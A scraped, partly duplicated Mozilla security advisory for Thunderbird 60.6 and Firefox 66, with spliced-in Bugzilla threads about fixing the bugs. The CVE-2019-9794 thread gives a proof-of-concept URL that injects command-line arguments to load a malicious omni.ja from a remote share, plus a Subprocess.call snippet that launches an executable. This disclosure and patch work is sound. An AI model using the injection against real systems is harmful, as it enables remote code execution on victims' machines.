## Security vulnerabilities fixed in Thunderbird 60.6

Announced
March 19, 2019
Impact
critical
Products
Thunderbird
Fixed in

* Thunderbird 60.6

*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2019-9790: Use-after-free when removing in-use DOM elements](#CVE-2019-9790)

Reporter
Brandon Wieser
Impact
critical
##### Description

A use-after-free vulnerability can occur when a raw pointer to a DOM element on a page is obtained using JavaScript and the element is then removed while still in use. This results in a potentially exploitable crash.

##### References

* [Bug 1525145](https://bugzilla.mozilla.org/show_bug.cgi?id=1525145)

#### [#CVE-2019-9791: Type inference is incorrect for constructors entered through on-stack replacement with IonMonkey](#CVE-2019-9791)

Reporter
Samuel Groß of Google Project Zero
Impact
critical
##### Description

The type inference system allows the compilation of functions that can cause type confusions between arbitrary objects when compiled through the IonMonkey just-in-time (JIT) compiler and when the constructor function is entered through on-stack replacement (OSR). This allows for possible arbitrary reading and writing of objects during an exploitable crash.

#### [#CVE-2019-9792: IonMonkey leaks JS\_OPTIMIZED\_OUT magic value to script](#CVE-2019-9792)

Reporter
Samuel Groß of Google Project Zero
Impact
critical
##### Description

The IonMonkey just-in-time (JIT) compiler can leak an internal `JS_OPTIMIZED_OUT` magic value to the running script during a bailout. This magic value can then be used by JavaScript to achieve memory corruption, which results in a potentially exploitable crash.

##### References

* [Bug 1532599](https://bugzilla.mozilla.org/show_bug.cgi?id=1532599)

#### [#CVE-2019-9793: Improper bounds checks when Spectre mitigations are disabled](#CVE-2019-9793)

Reporter
Bruno Keith & Niklas Baumstark from the phoenhex team
Impact
high
##### Description

A mechanism was discovered that removes some bounds checking for string, array, or typed array accesses if Spectre mitigations have been disabled. This vulnerability could allow an attacker to create an arbitrary value in compiled JavaScript, for which the range analysis will infer a fully controlled, incorrect range in circumstances where users have explicitly disabled Spectre mitigations.
 *Note: Spectre mitigations are currently enabled for all users by default settings.*

* [Bug 1528829](https://bugzilla.mozilla.org/show_bug.cgi?id=1528829)

#### [#CVE-2019-9794: Command line arguments not discarded during execution](#CVE-2019-9794)

Reporter
Joshua Graham
Impact
high
##### Description

A vulnerability was discovered where specific command line arguments are not properly discarded during Firefox invocation as a shell handler for URLs. This could be used to retrieve and execute files whose location is supplied through these command line arguments if Firefox is configured as the default URI handler for a given URI scheme in third party applications and these applications insufficiently sanitize URL data.
 *Note: This issue only affects Windows operating systems. Other operating systems are unaffected.*

#### [#CVE-2019-9795: Type-confusion in IonMonkey JIT compiler](#CVE-2019-9795)

Reporter
Nils
Impact
high
##### Description

A vulnerability where type-confusion in the IonMonkey just-in-time (JIT) compiler could potentially be used by malicious JavaScript to trigger a potentially exploitable crash.

##### References

* [Bug 1514682](https://bugzilla.mozilla.org/show_bug.cgi?id=1514682)

#### [#CVE-2019-9796: Use-after-free with SMIL animation controller](#CVE-2019-9796)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when the SMIL animation controller incorrectly registers with the refresh driver twice when only a single registration is expected. When a registration is later freed with the removal of the animation controller element, the refresh driver incorrectly leaves a dangling pointer to the driver's observer array.

##### References

* [Bug 1531277](https://bugzilla.mozilla.org/show_bug.cgi?id=1531277)

#### [#CVE-2019-9801: Windows programs that are not 'URL Handlers' are exposed to web content](#CVE-2019-9801)

Reporter
Daniel Veditz
Impact
moderate
##### Description

Firefox will accept any registered Program ID as an external protocol handler and offer to launch this local application when given a matching URL on Windows operating systems. This should only happen if the program has specifically registered itself as a "URL Handler" in the Windows registry.
 *Note: This issue only affects Windows operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1527717](https://bugzilla.mozilla.org/show_bug.cgi?id=1527717)

#### [#CVE-2018-18506: Proxy Auto-Configuration file can define localhost access to be proxied](#CVE-2018-18506)

Reporter
Jann Horn
Impact
moderate
##### Description

When proxy auto-detection is enabled, if a web server serves a Proxy Auto-Configuration (PAC) file or if a PAC file is loaded locally, this PAC file can specify that requests to the localhost are to be sent through the proxy to another server. This behavior is disallowed by default when a proxy is manually configured, but when enabled could allow for attacks on services and tools that bind to the localhost for networked behavior if they are accessed through browsing.

Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Bob Clary, Chun-Min Chang, Aral Yaman, Andreea Pavel, Jonathan Kew, Gary Kwong, Alex Gaynor, Masayuki Nakano, and Anne van Kesteren reported memory safety bugs present in Firefox 65, Firefox ESR 60.5, and Thunderbird 60.5. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Tested on Microsoft Windows 10 Enterprise version 10.0.17134 Build 17134

Using Firefox Quantum version 65.0.1 (64-bit)

Steps to reproduce:

1. Close all running instances of firefox
2. Open the run prompt (windows key + r) and run the following URL:

`https://www.tsscyber.com.au#" -greomni "\\remoteHost\omni.ja" -appomni "\\remoteHost\omni2.ja`

---

Expected Result: Firefox ignores the command as additional command line arguments are present.

Actual Result: Firefox accepts the command and attempts to retrieve ‘omni.ja’ and ‘omni2.ja’ from ‘remoteHost’. As ‘remoteHost’ likely doesn’t resolve to an IP, firefox crashes and ‘crashreporter.exe’ is run.

---

Detailed Information:

A malicious user can craft URIs in third party applications (tested using MS Outlook and MS Office) that can result in Remote Code Execution when Firefox is installed and configured as the default URI handler for a given URI scheme (e.g. http/https).

The ‘greomni’ and ‘appomni’ command line arguments are accepted via the URI handler command. These flags are used to specify the location of the ‘omni.ja’ file. An attacker can specify a network location for the ‘greomni’ and ‘appomni’ arguments to force Firefox to load malicious ‘omni.ja’ files. Some information about the 'omni.ja' files can be found here: [https://developer.mozilla.org/en-US/docs/Mozilla/About\_omni.ja\_(formerly\_omni.jar)](https://developer.mozilla.org/en-US/docs/Mozilla/About_omni.ja_%28formerly_omni.jar%29)

The shell command for HTTP URI’s is specified in the windows registry in an entry similar to:

Computer\HKEY\_CLASSES\_ROOT\FirefoxHTML-308046B0AF4A39CB\shell\open\command

The value is:

"C:\Program Files\Mozilla Firefox\firefox.exe" -osint -url "%1"

When the example malicious URL above is clicked, the command becomes:

`"C:\Program Files\Mozilla Firefox\firefox.exe" -osint -url "https://www.tsscyber.com.au#" -greomni "\\remoteHost\omni.ja" -appomni "\\remoteHost\omni2.ja"`

This issue can be exploited from Outlook and Office because they don’t URL Encode the hash segment of a URL making it possible to inject double quotes into the command. There are likely other programs that have similar behaviours.

The ‘osint’ flag in the command is supposed to ensure that Firefox ignores any command line arguments that have been injected via a malicious URL. The ‘osint’ flag was introduced in 2007 in response to the following bug: <https://bugzilla.mozilla.org/show_bug.cgi?id=384384>

I think that the issue occurs because the ‘greomni’ and ‘appomni’ command line arguments are used to retrieve the omni.ja files before the ‘osint’ flag is checked. The ‘greomni’ and ‘appomni’ arguments are then hidden from the ‘osint’ check because argc’s value is reduced by two. This means that when the ‘osint’ check is performed later, the value of argc matches the acceptable amount of command line arguments the ‘osint’ flag expects.

This is the area of code that I think is causing the issue:

<https://dxr.mozilla.org/mozilla-central/source/js/xpconnect/src/XPCShellImpl.cpp#1267>

I believe this is where the ‘osint’ flag is being checked:

<https://dxr.mozilla.org/mozilla-central/source/browser/components/nsBrowserContentHandler.js#648>

RCE is achieved by introducing malicious code into the contents of files in the omni.ja archives. We have had limited success launching arbitrary executables by injecting the following code into .js and .jws files (for example C:\Program Files (x86)\Mozilla Firefox\browser\omni.ja’s /chrome/browser/content/browser/browser.js file).

Components.utils.import("resource://gre/modules/Subprocess.jsm")

let opt = { command: "C:\windows\system32\calc.exe", arguments: [], workdir: "C:\windows\system32", stderr: "pipe"};

let x = Subprocess.call(opt);

I don't think it's about which happens first; I think it's that we don't hit <https://searchfox.org/mozilla-central/rev/dc0adc07db3df9431a0876156f50c65d580010cb/toolkit/xre/CmdLineAndEnvUtils.h#190-200> because we don't pass `CheckArgFlag::CheckOSInt` when looking up greomni/appomni at <https://searchfox.org/mozilla-central/rev/dc0adc07db3df9431a0876156f50c65d580010cb/toolkit/xre/nsAppRunner.cpp#4968> and further down in that file.

No, that's the commandline handling for the xpcshell binary (which isn't what the URI handler is). See my previous link for where Firefox processes these.

> I believe this is where the ‘osint’ flag is being checked:

That's in JS; the C++ also checks osint, and that code lives elsewhere.

I'm confused. greomni/appomni cmdline flags are about pointing to a different omni.ja . Here you're describing modifying the one that ships with Firefox. Isn't the "whole point" of abusing these flags that you'd want to point to some other, altered copy?

If you can modify the standard omni.ja, why do you need the special commandline flags? The two issues seem unrelated. In a normal setup on Windows, you would need admin rights on the machine to overwrite omni.ja . At that point, can't you just launch whatever executable you want anyway?

Aaron/Robert, looks like you've touched this stuff in the past. From a quick look: can we just pass `CheckArgFlag::CheckOSInt` when looking up greomni/appomni ? Better yet, can we make that the default path, and update any places that really really don't want to check for that commandline flag to pass some alternative enum/flag that means the opposite (ie make this opt-out instead of opt-in)?

Yes, you would want to point to some other altered copy. What I meant was that we created this alternative copy by modifying the copy that ships with Firefox to introduce malicious code. Then we hosted the modified malicious copy on an internet share and were able to force Firefox to load the malicious copy via a malicious link.

For clarity, the -osint command line flag was added to differentiate between a command line that came from an entry in the registry and a command line from start run, the command line, etc. When -osint is present we assume that the command line came from the registry (os integration) and restrict what is allowed while still allowing other command line flags that aren't from the registry.

I haven't looked at this code in a very long time but from what I can see it looks like greomni and appomni are handled in nsAppRunner.cpp and if osint is also present on the command line then the command line should be treated as invalid.

My involvement in that code was mainly for refactoring cleanup, so I'm going to defer to rstrong's understanding of the usage of the `osint` flag.

I just re-read my steps to reproduce and realise that the command is wrong (I wrote it as plain text but it was parsed as mark down).

The URL should be:

[https://www.tsscyber.com.au#](https://www.tsscyber.com.au)" -greomni "\\remoteHost\omni.ja" -appomni "\\remoteHost\omni2.ja

Where the "\\" prefix on the -greomni and -appomni paths means a UNC path to a remote file share hosted at "remoteHost". I hope this clears up the confusion around pointing to a different omni.ja file.

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Hard to say since to exploit this requires a combination of [bug 384384](/show_bug.cgi?id=384384 "RESOLVED FIXED - Multiple Vendor Multiple Browser Interaction URI Handler Command Injection Vulnerability") (which is open) and fixed around 12 years ago with the appomni and greomni command line arguments which were added around 8 years ago.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: I went back to Firefox 10 but probably older
* **If not all supported branches, which bug introduced the flaw?**: Uncertain
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: Easy to create and they shouldn't be risky
* **How likely is this patch to cause regressions; how much testing does it need?**: Unlikely though I'd like it to bake on trunk for a couple of days (like I do).

I know next to nothing about the appomni and greomni command line arguments having only learned about them due to this bug and I'm pretty sure I haven't touched this code in over a decade though I do know that the patch fixes this security bug and can be easily backported to beta, release, and esr. If you'd like a patch for this bug to possibly remove the arguments or reject UNC paths it would be better to abandon the current patch and get one of the developers that has knowledge of these command line arguments to work on this.

So it looks like the command line argument is used for passing the path down to child processes, possibly only needed on Android. Support for this originally landed in [bug 574120](/show_bug.cgi?id=574120 "RESOLVED FIXED - Electrolysis for Android") (<https://bugzilla.mozilla.org/attachment.cgi?id=453936&action=diff>), but both mwu and dougt aren't around anymore so not sure who might understand this. I wonder if we either don't need it at all, or only need it in child processes.

Anyway I agree we should get this fix landed now and we can consider whether to change these options later.

### Beta/Release Uplift Approval Request

* **Feature/Bug causing the regression**: Unknown though [bug 574120](/show_bug.cgi?id=574120 "RESOLVED FIXED - Electrolysis for Android") is part of the trail
* **User impact if declined**: A malicious user can craft URIs in third party applications (tested using MS Outlook and MS Office) that can result in Remote Code Execution when Firefox is installed and configured as the default URI handler for a given URI scheme (e.g. http/https).
* **Is this code covered by automated tests?**: No
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**: In case manual steps are desired, from [comment #0](/show_bug.cgi?id=1530103#c0 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox")

Close all running instances of firefox

Open the run prompt (windows key + r) and run the following URL:

[https://www.tsscyber.com.au#](https://www.tsscyber.com.au)" -greomni "\remoteHost\omni.ja" -appomni "\remoteHost\omni2.ja

Expected Result: Firefox ignores the command as additional command line arguments are present.

* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: The patch uses a method that has been in use for approximately 12 years
* **String changes made/needed**: None

### ESR Uplift Approval Request

* **If this is not a sec:{high,crit} bug, please state case for ESR consideration**:
* **User impact if declined**: A malicious user can craft URIs in third party applications (tested using MS Outlook and MS Office) that can result in Remote Code Execution when Firefox is installed and configured as the default URI handler for a given URI scheme (e.g. http/https).
* **Fix Landed on Version**: 67
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: The patch uses a method that has been in use for approximately 12 years

I don't have access to [bug 1531475](/show_bug.cgi?id=1531475 "RESOLVED FIXED - Evaluate whether the greomni and appomni command line args can be removed or have restrictions for their paths") but this information might be useful if you go down the path of blocking UNC values as there are some unusual quirks:

Can someone pass on the link or give me access to the bug?

I was able to reproduce this bug using an affected Nightly build (2019-02-23), and by following the steps from [comment 17](/show_bug.cgi?id=1530103#c17 "VERIFIED FIXED - URI handler Remote Code Execution via command line parameter injection in Firefox"). Note that Firefox needs to be set as default browser before the `https://www.tsscyber.com.au#" -greomni "\remoteHost\omni.ja" -appomni "\remoteHost\omni2.ja` URL is run in the run prompt.

Confirming that Firefox no longer crashes and ignores the command on the latest builds: 67.0a1, 66.0b13 and 60.5.3esr (downloaded from taskcluster).

* Firefox 66

#### [#CVE-2019-9790: Use-after-free when removing in-use DOM elements](#CVE-2019-9790)

Reporter
Brandon Wieser
Impact
critical
##### Description

A use-after-free vulnerability can occur when a raw pointer to a DOM element on a page is obtained using JavaScript and the element is then removed while still in use. This results in a potentially exploitable crash.

##### References

* [Bug 1525145](https://bugzilla.mozilla.org/show_bug.cgi?id=1525145)

#### [#CVE-2019-9791: Type inference is incorrect for constructors entered through on-stack replacement with IonMonkey](#CVE-2019-9791)

Reporter
Samuel Groß of Google Project Zero
Impact
critical
##### Description

The type inference system allows the compilation of functions that can cause type confusions between arbitrary objects when compiled through the IonMonkey just-in-time (JIT) compiler and when the constructor function is entered through on-stack replacement (OSR). This allows for possible arbitrary reading and writing of objects during an exploitable crash.

* [Bug 1530958](https://bugzilla.mozilla.org/show_bug.cgi?id=1530958)

#### [#CVE-2019-9792: IonMonkey leaks JS\_OPTIMIZED\_OUT magic value to script](#CVE-2019-9792)

Reporter
Samuel Groß of Google Project Zero
Impact
critical
##### Description

The IonMonkey just-in-time (JIT) compiler can leak an internal `JS_OPTIMIZED_OUT` magic value to the running script during a bailout. This magic value can then be used by JavaScript to achieve memory corruption, which results in a potentially exploitable crash.

##### References

* [Bug 1532599](https://bugzilla.mozilla.org/show_bug.cgi?id=1532599)

#### [#CVE-2019-9793: Improper bounds checks when Spectre mitigations are disabled](#CVE-2019-9793)

Reporter
Bruno Keith & Niklas Baumstark from the phoenhex team
Impact
high
##### Description

A mechanism was discovered that removes some bounds checking for string, array, or typed array accesses if Spectre mitigations have been disabled. This vulnerability could allow an attacker to create an arbitrary value in compiled JavaScript, for which the range analysis will infer a fully controlled, incorrect range in circumstances where users have explicitly disabled Spectre mitigations.
 *Note: Spectre mitigations are currently enabled for all users by default settings.*

* [Bug 1528829](https://bugzilla.mozilla.org/show_bug.cgi?id=1528829)

#### [#CVE-2019-9794: Command line arguments not discarded during execution](#CVE-2019-9794)

Reporter
Joshua Graham
Impact
high
##### Description

A vulnerability was discovered where specific command line arguments are not properly discarded during Firefox invocation as a shell handler for URLs. This could be used to retrieve and execute files whose location is supplied through these command line arguments if Firefox is configured as the default URI handler for a given URI scheme in third party applications and these applications insufficiently sanitize URL data.
 *Note: This issue only affects Windows operating systems. Other operating systems are unaffected.*

#### [#CVE-2019-9795: Type-confusion in IonMonkey JIT compiler](#CVE-2019-9795)

Reporter
Nils
Impact
high
##### Description

A vulnerability where type-confusion in the IonMonkey just-in-time (JIT) compiler could potentially be used by malicious JavaScript to trigger a potentially exploitable crash.

##### References

* [Bug 1514682](https://bugzilla.mozilla.org/show_bug.cgi?id=1514682)

#### [#CVE-2019-9796: Use-after-free with SMIL animation controller](#CVE-2019-9796)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when the SMIL animation controller incorrectly registers with the refresh driver twice when only a single registration is expected. When a registration is later freed with the removal of the animation controller element, the refresh driver incorrectly leaves a dangling pointer to the driver's observer array.

* [Bug 1531277](https://bugzilla.mozilla.org/show_bug.cgi?id=1531277)

#### [#CVE-2019-9797: Cross-origin theft of images with createImageBitmap](#CVE-2019-9797)

Reporter
AaylaSecura1138
Impact
high
##### Description

Cross-origin images can be read in violation of the same-origin policy by exporting an image after using `createImageBitmap` to read the image and then rendering the resulting bitmap image within a `canvas` element.

##### References

* [Bug 1528909](https://bugzilla.mozilla.org/show_bug.cgi?id=1528909)

#### [#CVE-2019-9798: Library is loaded from world writable APITRACE\_LIB location](#CVE-2019-9798)

Reporter
Jeff Gilbert
Impact
high
##### Description

On Android systems, Firefox can load a library from `APITRACE_LIB`, which is writable by all users and applications. This could allow malicious third party applications to execute a man-in-the-middle attack if a malicious code was written to that location and loaded.
 *Note: This issue only affects Android. Other operating systems are unaffected.*

* [Bug 1527534](https://bugzilla.mozilla.org/show_bug.cgi?id=1527534)

#### [#CVE-2019-9799: Information disclosure via IPC channel messages](#CVE-2019-9799)

Reporter
Paul Theriault
Impact
high
##### Description

Insufficient bounds checking of data during inter-process communication might allow a compromised content process to be able to read memory from the parent process under certain conditions.

##### References

* [Bug 1505678](https://bugzilla.mozilla.org/show_bug.cgi?id=1505678)

#### [#CVE-2019-9801: Windows programs that are not 'URL Handlers' are exposed to web content](#CVE-2019-9801)

Reporter
Daniel Veditz
Impact
moderate
##### Description

Firefox will accept any registered Program ID as an external protocol handler and offer to launch this local application when given a matching URL on Windows operating systems. This should only happen if the program has specifically registered itself as a "URL Handler" in the Windows registry.
 *Note: This issue only affects Windows operating systems. Other operating systems are unaffected.*

* [Bug 1527717](https://bugzilla.mozilla.org/show_bug.cgi?id=1527717)

#### [#CVE-2019-9802: Chrome process information leak](#CVE-2019-9802)

Reporter
Stephen Fewer
Impact
moderate
##### Description

If a Sandbox content process is compromised, it can initiate an FTP download which will then use a child process to render the downloaded data. The downloaded data can then be passed to the Chrome process with an arbitrary file length supplied by an attacker, bypassing sandbox protections and allow for a potential memory read of adjacent data from the privileged Chrome process, which may include sensitive data.

#### [#CVE-2019-9803: Upgrade-Insecure-Requests incorrectly enforced for same-origin navigation](#CVE-2019-9803)

Reporter
Xiaoyin Liu, Vinothkumar Nagasayanan
Impact
moderate
##### Description

The Upgrade-Insecure-Requests (UIR) specification states that if UIR is enabled through Content Security Policy (CSP), navigation to a same-origin URL must be upgraded to HTTPS. Firefox will incorrectly navigate to an HTTP URL rather than perform the security upgrade requested by the CSP in some circumstances, allowing for potential man-in-the-middle attacks on the linked resources.

#### [#CVE-2019-9804: Code execution through 'Copy as cURL' in Firefox Developer Tools on macOS](#CVE-2019-9804)

Reporter
potatoe
Impact
moderate
##### Description

In Firefox Developer Tools it is possible that pasting the result of the 'Copy as cURL' command into a command shell on macOS will cause the execution of unintended additional bash script commands if the URL was maliciously crafted. This is the result of an issue with the native version of Bash on macOS.
 *Note: This issue only affects macOS. Other operating systems are unaffected.*

#### [#CVE-2019-9807: Text sent through FTP connection can be incorporated into alert messages](#CVE-2019-9807)

Reporter
Hanno Böck
Impact
low
##### Description

When arbitrary text is sent over an FTP connection and a page reload is initiated, it is possible to create a modal alert message with this text as the content. This could potentially be used for social engineering attacks.

##### References

Reporter
Jun Kokatsu
Impact
low
##### Description

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Dragana Damjanovic, Emilio Cobos Álvarez, Henri Sivonen, Narcis Beleuzu, Julian Seward, Marcia Knous, Gary Kwong, Tyson Smith, Yaron Tausky, Ronald Crane, and André Bargull reported memory safety bugs present in Firefox 65.

##### Description

Mozilla developers and community members Bob Clary, Chun-Min Chang, Aral Yaman, Andreea Pavel, Jonathan Kew, Gary Kwong, Alex Gaynor, Masayuki Nakano, and Anne van Kesteren reported memory safety bugs present in Firefox 65 and Firefox ESR 60.5. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

— [Details](attachment.cgi?id=9044718&action=edit)

The bug exists in the current release and mozilla-central branches of the Spidermonkey engine included in Firefox. It exists on all platforms.

The issue lets an attacker produce an arbitrary value in compiled JavaScript code, for which the range analysis will infer a fully controlled, incorrect range. For a detailed analysis of the issue and its exploitability, along with reproducing code samples, please refer to the attached writeup.md file.

(apparently we weren't testing --ion-warmup-threshold=0 . fuzz-flags.txt only tests the value of 100, and this testcase does not reproduce with 100, only with 10 and 0 (values that I tested).)

Ok, if I understand correctly, the issue is in Fold Linear Arithmetic, as it mistakenly join an overflow with an underflow check.

While both checks are the same, it seems safe to join an overflow check with an overflow check as well as joining an underflow check with an underflow check.

Range Analysis assumed that both the overflow checks and the underflow checks would result in a bailout and that the range can safely be computed within the non-bailing bounds. However, folding an overflow with an underflow is shrinking the range from both sides.

This issue can be solved by either inserting a bound-check instruction or by forbidding folding overflow with underflow checks.

This sounds more than likely to be the case. As it introduces the optimization which is folding the overflow check with the underflow check.

I will proof-read similar code before asking for approval & uplift.

[Bug 1528829](/show_bug.cgi?id=1528829 "RESOLVED FIXED - Arbitrary range mis-inference due to loop phi range analysis disregarding overflows/truncation") - Restrict ExtractLinearSum to monotonous operation in infinite math space.

## Security Approval Request

### How easily could an exploit be constructed based on the patch?

The patch hint that this is a bound-check error and that this is related to numbers of alternating signs.

### Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?

Yes

### Which older supported branches are affected by this flaw?

all

### If not all supported branches, which bug introduced the flaw?

[Bug 1295130](/show_bug.cgi?id=1295130 "RESOLVED FIXED - Fold AddI opcode with constant into other AddI with constant")

### Do you have backports for the affected branches?

No

### If not, how different, hard to create, and risky will they be?

We had 2 different coding style changes affecting the backport of this patch, but it should be easy to redo this patch on old branches, as the latest big change was [Bug 1319242](/show_bug.cgi?id=1319242 "RESOLVED FIXED - Differential Testing: Different output message involving addition").

### How likely is this patch to cause regressions; how much testing does it need?

This patch might cause performance regressions as it prevent code to optimize cases and now split the code. The worse case would appear on code which does something like:

```
i+=1;
i-=1;
i+=1;
i-=1;
i+=1;
i-=1;
i+=1;
i-=1;
i+=1;
i-=1;
// …

```

If these appear to be a performance issue which matter, then we should make a follow-up bug to implement the second proposal presented in [comment 5](/show_bug.cgi?id=1528829#c5 "RESOLVED FIXED - Arbitrary range mis-inference due to loop phi range analysis disregarding overflows/truncation"), which is to create a bound-check instruction when a SimpleLinearSum is used to create a MIR instruction.

Apparently the clang-format got applied to all branches, so I saw no issue to backport [attachment 9044938](/attachment.cgi?id=9044938 "Bug 1528829 - Restrict ExtractLinearSum to monotonous operation in infinite math space.") [[details]](/attachment.cgi?id=9044938&action=edit "Bug 1528829 - Restrict ExtractLinearSum to monotonous operation in infinite math space.") to beta and release.

However, I made [attachment 9045629](/attachment.cgi?id=9045629 "Bug 1528829 - Restrict ExtractLinearSum to monotonous operation in infinite math space.") [[details]](/attachment.cgi?id=9045629&action=edit "Bug 1528829 - Restrict ExtractLinearSum to monotonous operation in infinite math space.") to backport this change to esr-60.

[Bug 1528829](/show_bug.cgi?id=1528829 "RESOLVED FIXED - Arbitrary range mis-inference due to loop phi range analysis disregarding overflows/truncation") - Restrict ExtractLinearSum to monotonous operation in infinite math space.

## Beta/Release Uplift Approval Request

### Feature/Bug causing the regression

[Bug 1295130](/show_bug.cgi?id=1295130 "RESOLVED FIXED - Fold AddI opcode with constant into other AddI with constant")

### User impact if declined

Potential out-of-bound failures.

### Is this code covered by automated tests?

Yes

### Has the fix been verified in Nightly?

Yes

### Needs manual test from QE?

No

### If yes, steps to reproduce

### List of other uplifts needed

None

### Risk to taking this patch

Low

### Why is the change risky/not risky? (and alternatives if risky)

The change is not risky, because it is small and applies to all uses of ExtractLinearSum.

It limits the ability of ExtractLinearSum to merge terms which are not monotonously increasing/decreasing constants, which avoid merging an underflow check with an overflow check, when working in the infinite math-space represented on the int32 range.

### String changes made/needed

"The change is not risky, because it is small and applies to all uses of ExtractLinearSum." I'm going to just take your word for that :) Sounds like it didn't cause problems on Nightly.

OK for uplift for beta 11.
